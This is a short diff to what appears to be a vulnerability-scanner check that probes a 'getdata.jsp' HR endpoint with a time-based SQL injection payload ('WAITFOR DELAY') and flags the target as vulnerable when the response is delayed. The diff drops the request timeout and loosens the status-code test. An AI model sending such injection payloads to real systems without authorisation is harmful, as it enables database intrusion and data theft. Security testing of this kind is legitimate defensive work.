@@ -18,8 +18,8 @@ def verify(url):
     }
     vurl = urllib.parse.urljoin(url, "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=WAITFOR+DELAY+%270%3A0%3A5%27")
     try:
-        response = requests.get(vurl, headers=headers, timeout=15)
-        if response.status_code == 200 and response.elapsed.total_seconds() > 5:
+        response = requests.get(vurl, headers=headers)
+        if response.status_code not in range(400, 499) and response.elapsed.total_seconds() > 5:
             relsult['vulnerable'] = True
             relsult['verify'] = vurl
         return relsult
